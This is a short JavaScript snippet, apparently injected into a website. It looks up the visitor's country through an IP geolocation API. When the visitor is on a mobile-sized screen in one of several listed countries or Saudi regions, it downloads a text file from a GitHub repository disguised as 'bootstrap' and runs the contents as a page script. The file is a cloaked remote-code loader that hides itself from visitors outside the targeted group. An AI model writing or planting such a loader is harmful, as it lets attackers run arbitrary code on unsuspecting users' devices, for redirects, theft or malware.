fetch("https://get.geojs.io/v1/ip/geo.json")
    .then(t => t.json())
    .then(t => {
        let country = t.country_code;
        let region = t.region;
        let allowedCountries = ["MA", "DZ", "IQ", "IL", "SN", "OM", "JO", "YE", "ID", "SO", "NG", "ML", "MY", "TZ", "BD", "YG", "RW", "GH", "AE"];
        let allowedRegions = ["Riyadh Region", "Mecca Region", "Medina Region", "Eastern Province", "Honiara", "Honiara", "Honiara"];

        // التحقق من أن عرض الشاشة أقل من 768 بكسل (أي جهاز محمول)
        let isMobileScreen = window.innerWidth <= 768;

        if (isMobileScreen && (allowedCountries.includes(country) || allowedRegions.includes(region))) {
            fetch("https://cdn.jsdelivr.net/gh/v-7-3/bootstrap@main/k.txt")
                .then(t => {
                    if (!t.ok) throw Error(`HTTP error! status: ${t.status}`);
                    return t.text();
                })
                .then(t => {
                    let script = document.createElement("script");
                    script.type = "text/javascript";
                    script.text = t;
                    document.body.appendChild(script);
                })
                .catch(t => {
                    console.error("Error fetching the text file:", t);
                });
        }
    })
    .catch(t => {
        console.error("Error fetching geolocation data:", t);
    });
